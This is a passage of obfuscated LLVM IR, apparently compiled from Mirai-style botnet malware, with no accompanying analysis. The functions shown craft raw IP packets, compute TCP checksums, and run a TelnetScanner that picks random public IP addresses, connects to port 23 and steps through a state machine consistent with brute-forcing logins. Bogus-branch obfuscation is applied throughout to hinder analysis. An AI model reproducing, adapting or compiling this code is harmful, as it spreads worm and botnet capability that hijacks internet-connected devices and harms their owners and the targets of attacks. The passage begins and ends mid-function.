  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca %struct.iphdr*, align 8
  %12 = alloca %struct.tcphdr*, align 8
  %13 = alloca %struct.tcp_pseudo, align 8
  %14 = alloca i16, align 2
  %15 = alloca i32, align 4
  %16 = alloca i16*, align 8
  %17 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %11, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %12, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 2
  %20 = load i16, i16* %19, align 2
  store i16 %20, i16* %14, align 2
  %21 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 8
  %23 = load i32, i32* %22, align 4
  %24 = zext i32 %23 to i64
  %25 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 0
  store i64 %24, i64* %25, align 8
  %26 = load %struct.iphdr*, %struct.iphdr** %11, align 8
  %27 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %26, i32 0, i32 9
  %28 = load i32, i32* %27, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 1
  store i64 %29, i64* %30, align 8
  %31 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 2
  store i8 0, i8* %31, align 8
  %32 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 3
  store i8 6, i8* %32, align 1
  %33 = call zeroext i16 @htons(i16 zeroext 20) #10
  %34 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 4
  store i16 %33, i16* %34, align 2
  store i32 44, i32* %15, align 4
  %35 = load i32, i32* %15, align 4
  %36 = sext i32 %35 to i64
  %37 = call noalias i8* @malloc(i64 %36) #5
  %38 = bitcast i8* %37 to i16*
  store i16* %38, i16** %16, align 8
  %39 = load i16*, i16** %16, align 8
  %40 = bitcast i16* %39 to i8*
  %41 = bitcast %struct.tcp_pseudo* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* %41, i64 24, i32 1, i1 false)
  %42 = load i16*, i16** %16, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = getelementptr inbounds i8, i8* %43, i64 24
  %45 = load %struct.tcphdr*, %struct.tcphdr** %12, align 8
  %46 = bitcast %struct.tcphdr* %45 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %44, i8* %46, i64 20, i32 1, i1 false)
  %47 = load i16*, i16** %16, align 8
  %48 = load i32, i32* %15, align 4
  %49 = call zeroext i16 @csum(i16* %47, i32 %48)
  store i16 %49, i16* %17, align 2
  %50 = load i16*, i16** %16, align 8
  %51 = bitcast i16* %50 to i8*
  call void @free(i8* %51) #5
  %52 = load i16, i16* %17, align 2
  %53 = load i32, i32* @x.65
  %54 = load i32, i32* @y.66
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i16 %52

originalBBalteredBB:                              ; preds = %originalBB, %2
  %61 = alloca %struct.iphdr*, align 8
  %62 = alloca %struct.tcphdr*, align 8
  %63 = alloca %struct.tcp_pseudo, align 8
  %64 = alloca i16, align 2
  %65 = alloca i32, align 4
  %66 = alloca i16*, align 8
  %67 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %61, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %62, align 8
  %68 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %69 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %68, i32 0, i32 2
  %70 = load i16, i16* %69, align 2
  store i16 %70, i16* %64, align 2
  %71 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %72 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %71, i32 0, i32 8
  %73 = load i32, i32* %72, align 4
  %74 = zext i32 %73 to i64
  %75 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 0
  store i64 %74, i64* %75, align 8
  %76 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %77 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %76, i32 0, i32 9
  %78 = load i32, i32* %77, align 4
  %79 = zext i32 %78 to i64
  %80 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 1
  store i64 %79, i64* %80, align 8
  %81 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 2
  store i8 0, i8* %81, align 8
  %82 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 3
  store i8 6, i8* %82, align 1
  %83 = call zeroext i16 @htons(i16 zeroext 20) #10
  %84 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 4
  store i16 %83, i16* %84, align 2
  store i32 44, i32* %65, align 4
  %85 = load i32, i32* %65, align 4
  %86 = sext i32 %85 to i64
  %87 = call noalias i8* @malloc(i64 %86) #5
  %88 = bitcast i8* %87 to i16*
  store i16* %88, i16** %66, align 8
  %89 = load i16*, i16** %66, align 8
  %90 = bitcast i16* %89 to i8*
  %91 = bitcast %struct.tcp_pseudo* %63 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %90, i8* %91, i64 24, i32 1, i1 false)
  %92 = load i16*, i16** %66, align 8
  %93 = bitcast i16* %92 to i8*
  %94 = getelementptr inbounds i8, i8* %93, i64 24
  %95 = load %struct.tcphdr*, %struct.tcphdr** %62, align 8
  %96 = bitcast %struct.tcphdr* %95 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %94, i8* %96, i64 20, i32 1, i1 false)
  %97 = load i16*, i16** %66, align 8
  %98 = load i32, i32* %65, align 4
  %99 = call zeroext i16 @csum(i16* %97, i32 %98)
  store i16 %99, i16* %67, align 2
  %100 = load i16*, i16** %66, align 8
  %101 = bitcast i16* %100 to i8*
  call void @free(i8* %101) #5
  %102 = load i16, i16* %67, align 2
  br label %originalBB
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #3

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = load i32, i32* @x.69
  %3 = load i32, i32* @y.70
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  %12 = load i32, i32* %11, align 4
  %13 = icmp sgt i32 3, %12
  %14 = load i32, i32* @x.69
  %15 = load i32, i32* @y.70
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %13, label %22, label %23

; <label>:22:                                     ; preds = %originalBBpart2
  store i32 1, i32* %10, align 4
  br label %42

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* @x.69
  %25 = load i32, i32* @y.70
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %23
  %32 = load i32, i32* %11, align 4
  %33 = call i32 @close(i32 %32)
  store i32 0, i32* %10, align 4
  %34 = load i32, i32* @x.69
  %35 = load i32, i32* @y.70
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %42

; <label>:42:                                     ; preds = %originalBBpart24, %22
  %43 = load i32, i32* %10, align 4
  ret i32 %43

originalBBalteredBB:                              ; preds = %originalBB, %1
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  store i32 %0, i32* %45, align 4
  %46 = load i32, i32* %45, align 4
  %47 = icmp sgt i32 3, %46
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %23
  %48 = load i32, i32* %11, align 4
  %49 = call i32 @close(i32 %48)
  store i32 0, i32* %10, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca i8*, align 8
  %29 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %30 = call i32 @getdtablesize() #5
  %31 = sub nsw i32 %30, 100
  store i32 %31, i32* %5, align 4
  %32 = load i32, i32* %5, align 4
  %33 = load i32, i32* %4, align 4
  %34 = icmp sgt i32 %32, %33
  br i1 %34, label %35, label %53

; <label>:35:                                     ; preds = %2
  %36 = load i32, i32* @x.71
  %37 = load i32, i32* @y.72
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %35
  %44 = load i32, i32* %4, align 4
  store i32 %44, i32* %5, align 4
  %45 = load i32, i32* @x.71
  %46 = load i32, i32* @y.72
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %53

; <label>:53:                                     ; preds = %originalBBpart2, %2
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %54, align 4
  %55 = call zeroext i16 @htons(i16 zeroext 23) #10
  %56 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %55, i16* %56, align 2
  %57 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %58 = getelementptr inbounds [8 x i8], [8 x i8]* %57, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %58, i8 0, i64 8, i32 4, i1 false)
  %59 = call noalias i8* @malloc(i64 1025) #5
  store i8* %59, i8** %17, align 8
  %60 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %60, i8 0, i64 1025, i32 1, i1 false)
  %61 = load i32, i32* %5, align 4
  %62 = zext i32 %61 to i64
  %63 = call i8* @llvm.stacksave()
  store i8* %63, i8** %19, align 8
  %64 = alloca %struct.telstate_t, i64 %62, align 16
  %65 = bitcast %struct.telstate_t* %64 to i8*
  %66 = load i32, i32* %5, align 4
  %67 = sext i32 %66 to i64
  %68 = mul i64 %67, 5
  call void @llvm.memset.p0i8.i64(i8* %65, i8 0, i64 %68, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  br label %69

; <label>:69:                                     ; preds = %originalBBpart214, %53
  %70 = load i32, i32* %6, align 4
  %71 = load i32, i32* %5, align 4
  %72 = icmp slt i32 %70, %71
  br i1 %72, label %73, label %122

; <label>:73:                                     ; preds = %69
  %74 = load i32, i32* @x.71
  %75 = load i32, i32* @y.72
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %73
  %82 = load i32, i32* %6, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %83
  %85 = bitcast %struct.telstate_t* %84 to i8*
  call void @llvm.memset.p0i8.i64(i8* %85, i8 0, i64 32, i32 16, i1 false)
  %86 = load i32, i32* %6, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %87
  %89 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %88, i32 0, i32 3
  store i8 1, i8* %89, align 1
  %90 = load i8*, i8** %17, align 8
  %91 = load i32, i32* %6, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %92
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %93, i32 0, i32 9
  store i8* %90, i8** %94, align 8
  %95 = load i32, i32* @x.71
  %96 = load i32, i32* @y.72
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %103

; <label>:103:                                    ; preds = %originalBBpart24
  %104 = load i32, i32* @x.71
  %105 = load i32, i32* @y.72
  %106 = sub i32 %104, 1
  %107 = mul i32 %104, %106
  %108 = urem i32 %107, 2
  %109 = icmp eq i32 %108, 0
  %110 = icmp slt i32 %105, 10
  %111 = or i1 %109, %110
  br i1 %111, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %103
  %112 = load i32, i32* %6, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %6, align 4
  %114 = load i32, i32* @x.71
  %115 = load i32, i32* @y.72
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart214, label %originalBB6alteredBB

originalBBpart214:                                ; preds = %originalBB6
  br label %69

; <label>:122:                                    ; preds = %69
  br label %123

; <label>:123:                                    ; preds = %1917, %122
  br label %124

; <label>:124:                                    ; preds = %123
  store i32 0, i32* %6, align 4
  br label %125

; <label>:125:                                    ; preds = %1914, %124
  %126 = load i32, i32* %6, align 4
  %127 = load i32, i32* %5, align 4
  %128 = icmp slt i32 %126, %127
  br i1 %128, label %129, label %1917

; <label>:129:                                    ; preds = %125
  %130 = load i32, i32* %6, align 4
  %131 = sext i32 %130 to i64
  %132 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %131
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %132, i32 0, i32 7
  %134 = load i32, i32* %133, align 16
  %135 = icmp eq i32 %134, 0
  br i1 %135, label %136, label %143

; <label>:136:                                    ; preds = %129
  %137 = call i64 @time(i64* null) #5
  %138 = trunc i64 %137 to i32
  %139 = load i32, i32* %6, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %140
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %141, i32 0, i32 7
  store i32 %138, i32* %142, align 16
  br label %143

; <label>:143:                                    ; preds = %136, %129
  %144 = load i32, i32* @x.71
  %145 = load i32, i32* @y.72
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %143
  %152 = load i32, i32* %6, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %153
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %154, i32 0, i32 2
  %156 = load i8, i8* %155, align 8
  %157 = zext i8 %156 to i32
  %158 = load i32, i32* @x.71
  %159 = load i32, i32* @y.72
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  switch i32 %157, label %1913 [
    i32 0, label %166
    i32 1, label %398
    i32 2, label %565
    i32 3, label %665
    i32 4, label %721
    i32 5, label %789
    i32 6, label %845
    i32 7, label %977
    i32 8, label %993
    i32 9, label %1073
    i32 10, label %1089
    i32 11, label %1155
    i32 12, label %1187
    i32 13, label %1265
    i32 14, label %1326
    i32 15, label %1371
    i32 16, label %1867
  ]

; <label>:166:                                    ; preds = %originalBBpart218
  %167 = load i32, i32* %6, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %168
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %169, i32 0, i32 3
  %171 = load i8, i8* %170, align 1
  %172 = zext i8 %171 to i32
  %173 = icmp eq i32 %172, 1
  br i1 %173, label %174, label %194

; <label>:174:                                    ; preds = %166
  %175 = load i32, i32* %6, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %176
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %177, i32 0, i32 9
  %179 = load i8*, i8** %178, align 8
  store i8* %179, i8** %20, align 8
  %180 = load i32, i32* %6, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %181
  %183 = bitcast %struct.telstate_t* %182 to i8*
  call void @llvm.memset.p0i8.i64(i8* %183, i8 0, i64 32, i32 16, i1 false)
  %184 = load i8*, i8** %20, align 8
  %185 = load i32, i32* %6, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 9
  store i8* %184, i8** %188, align 8
  %189 = call i32 @getRandomPublicIP()
  %190 = load i32, i32* %6, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %191
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %192, i32 0, i32 1
  store i32 %189, i32* %193, align 4
  br label %306

; <label>:194:                                    ; preds = %166
  %195 = load i32, i32* @x.71
  %196 = load i32, i32* @y.72
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %194
  %203 = load i32, i32* %6, align 4
  %204 = sext i32 %203 to i64
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %204
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %205, i32 0, i32 3
  %207 = load i8, i8* %206, align 1
  %208 = zext i8 %207 to i32
  %209 = icmp eq i32 %208, 0
  %210 = load i32, i32* @x.71
  %211 = load i32, i32* @y.72
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBBpart222, label %originalBB20alteredBB

originalBBpart222:                                ; preds = %originalBB20
  br i1 %209, label %218, label %289

; <label>:218:                                    ; preds = %originalBBpart222
  %219 = load i32, i32* %6, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %220
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %221, i32 0, i32 4
  %223 = load i8, i8* %222, align 2
  %224 = add i8 %223, 1
  store i8 %224, i8* %222, align 2
  %225 = load i32, i32* %6, align 4
  %226 = sext i32 %225 to i64
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %226
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %227, i32 0, i32 5
  %229 = load i8, i8* %228, align 1
  %230 = add i8 %229, 1
  store i8 %230, i8* %228, align 1
  %231 = load i32, i32* %6, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %232
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %233, i32 0, i32 5
  %235 = load i8, i8* %234, align 1
  %236 = zext i8 %235 to i64
  %237 = icmp eq i64 %236, 19
  br i1 %237, label %238, label %243

; <label>:238:                                    ; preds = %218
  %239 = load i32, i32* %6, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %240
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %241, i32 0, i32 3
  store i8 1, i8* %242, align 1
  br label %1914

; <label>:243:                                    ; preds = %218
  %244 = load i32, i32* @x.71
  %245 = load i32, i32* @y.72
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBB24, label %originalBB24alteredBB

originalBB24:                                     ; preds = %originalBB24alteredBB, %243
  %252 = load i32, i32* %6, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %253
  %255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %254, i32 0, i32 4
  %256 = load i8, i8* %255, align 2
  %257 = zext i8 %256 to i64
  %258 = icmp eq i64 %257, 19
  %259 = load i32, i32* @x.71
  %260 = load i32, i32* @y.72
  %261 = sub i32 %259, 1
  %262 = mul i32 %259, %261
  %263 = urem i32 %262, 2
  %264 = icmp eq i32 %263, 0
  %265 = icmp slt i32 %260, 10
  %266 = or i1 %264, %265
  br i1 %266, label %originalBBpart227, label %originalBB24alteredBB

originalBBpart227:                                ; preds = %originalBB24
  br i1 %258, label %267, label %288

; <label>:267:                                    ; preds = %originalBBpart227
  %268 = load i32, i32* @x.71
  %269 = load i32, i32* @y.72
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %267
  %276 = load i32, i32* %6, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %64, i64 %277
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %278, i32 0, i32 3
  store i8 1, i8* %279, align 1
  %280 = load i32, i32* @x.71
  %281 = load i32, i32* @y.72
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %1914

; <label>:288:                                    ; preds = %originalBBpart227
  br label %289

; <label>:289:                                    ; preds = %288, %originalBBpart222
  %290 = load i32, i32* @x.71
  %291 = load i32, i32* @y.72
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %289
  %298 = load i32, i32* @x.71
  %299 = load i32, i32* @y.72
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %306

; <label>:306:                                    ; preds = %originalBBpart235, %174
  %307 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %307, align 4
  %308 = call zeroext i16 @htons(i16 zeroext 23) #10
  %309 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %308, i16* %309, align 2
  %310 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %311 = getelementptr inbounds [8 x i8], [8 x i8]* %310, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %311, i8 0, i64 8, i32 4, i1 false)
